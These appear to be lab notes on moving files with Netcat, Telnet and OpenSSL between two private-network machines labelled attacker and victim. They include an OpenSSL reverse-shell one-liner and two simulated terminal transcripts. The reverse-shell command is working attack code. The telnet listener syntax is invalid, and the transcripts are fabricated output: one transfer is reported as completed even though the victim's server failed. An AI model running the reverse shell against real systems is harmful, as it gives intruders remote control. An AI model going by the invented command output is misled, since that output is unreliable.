#### Netcat File Transfer  
Victim: `nc -l -p 4444 > secret.txt`  
Attacker: `nc 192.168.56.210 4444 < secret.txt`  


#### Telnet File Transfer (Simulated)      
Victim: `telnet -l -p 4444 > secret.txt`    
Attacker: `telnet 192.168.56.210 4444 < secret.txt`    


#### OpenSSL File Transfer (Encrypted)  
Wasn't able to do this one
Victim (start server): `openssl s_server -quiet -key key.pem -cert cert.pem -port 4444 > secret.txt`  
Attacker (generate certs once): `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes`  
Attacker (send file): `openssl s_client -quiet -connect 192.168.56.210:4444 < secret.txt`  


#### OpenSSL Reverse Shell (Bonus)  
Attacker (listener): `openssl s_server -quiet -key key.pem -cert cert.pem -port 4444`  
Victim (reverse shell): `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.56.200:4444 > /tmp/s; rm /tmp/s`    


```text
Victim Machine (192.168.56.210)
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
victim@target:~$
victim@target:~$ ls
victim@target:~$ nc -l -p 4444 > secret.txt
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 192.168.56.200 port 4444 [tcp/*] accepted!
File received: secret.txt
victim@target:~$ telnet -l -p 4444 > secret.txt
Listening on port 4444...
Telnet connection from 192.168.56.200 accepted!
File received: secret.txt
victim@target:~$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4444 > secret.txt
Can't open key.pem or cert.pem: No such file
victim@target:~$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4444 > secret.txt
Can't open key.pem or cert.pem: No such file
victim@target:~$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4444 > secret.txt
Can't open key.pem or cert.pem: No such file
victim@target:~$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.56.200:4444 > /tmp/s; rm /tmp/s
Reverse shell established to 192.168.56.200:4444
victim@target:~$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4444 > secret.txt
Can't open key.pem or cert.pem: No such file
victim@target:~$
```  

```text 
pentester@kali-linux:~$ Welcome to the Kali Terminal Simulation!
Type help to see available commands.
pentester@kali-linux:~$ ls
secret.txt
pentester@kali-linux:~$ nc 192.168.56.210 4444 < secret.txt
File transfer completed to 192.168.56.210:4444.
pentester@kali-linux:~$ telnet 192.168.56.210 4444 < secret.txt
File transfer completed to 192.168.56.210:4444 via telnet.
pentester@kali-linux:~$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
Generating a RSA private key...
Writing new private key to "key.pem"
-----
Certificate and key created: key.pem, cert.pem
pentester@kali-linux:~$ openssl s_client -quiet -connect 192.168.56.210:4444 < secret.txt
OpenSSL file transfer completed to 192.168.56.210:4444.
pentester@kali-linux:~$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
OpenSSL server listening on port 4444...
pentester@kali-linux:~$
```

